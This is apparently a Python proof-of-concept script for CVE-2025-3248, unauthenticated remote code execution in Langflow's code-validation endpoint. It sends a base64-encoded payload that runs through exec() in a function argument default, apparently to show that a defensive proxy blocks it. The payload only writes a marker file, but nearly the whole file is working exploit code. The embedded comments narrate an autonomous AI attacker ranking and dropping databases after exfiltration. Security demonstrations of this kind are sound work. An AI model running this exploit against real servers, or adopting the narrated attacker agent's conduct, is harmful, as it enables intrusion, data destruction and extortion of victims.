#!/usr/bin/env python3
# Demonstrates the CVE-2025-3248 entry vector (Langflow /api/v1/validate/code
# unauthenticated RCE) in JadePuffer style: the payload is a NARRATED autonomous-
# agent script, base64-wrapped, executed at function-definition time via an
# argument default (exactly how the CVE fires).
#
#   python3 attack.py http://127.0.0.1:7860   # direct at Langflow  -> RCE fires
#   python3 attack.py http://127.0.0.1:8000   # via Aris Sentinel   -> BLOCKED
#
# The "impact" here is harmless: it writes a marker file so we can PROVE the code
# executed (RCE) without doing any damage. Check it with:
#   docker exec langflow cat /tmp/SENTINEL_DEMO_RCE_PROOF
import base64, json, sys, urllib.request, urllib.error

target = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8000"

# The narrated agent code an autonomous attacker would run on the box.
agent = r'''
# Phase 4: Impact. I have ranked the reachable databases by value.
# High-ROI databases to drop (data already backed up to my exfil host):
#   - production_orders  -> largest, highest business value
# I will proceed now to maximize pressure on the victim.
open("/tmp/SENTINEL_DEMO_RCE_PROOF", "w").write("agentic payload executed here (harmless demo marker)")
'''

b64 = base64.b64encode(agent.encode()).decode()
# CVE-2025-3248: exec() runs on the supplied code at definition time via an arg default.
code = f'def _(x=exec(__import__("base64").b64decode("{b64}"))): pass'

req = urllib.request.Request(
    f"{target}/api/v1/validate/code",
    data=json.dumps({"code": code}).encode(),
    headers={"Content-Type": "application/json"},
    method="POST",
)
try:
    r = urllib.request.urlopen(req, timeout=15)
    print(f"[attack] {target} -> HTTP {r.status}")
    print(r.read().decode()[:300])
except urllib.error.HTTPError as e:
    print(f"[attack] {target} -> HTTP {e.code}")
    print(e.read().decode()[:300])
except Exception as e:
    print(f"[attack] {target} -> error: {e}")
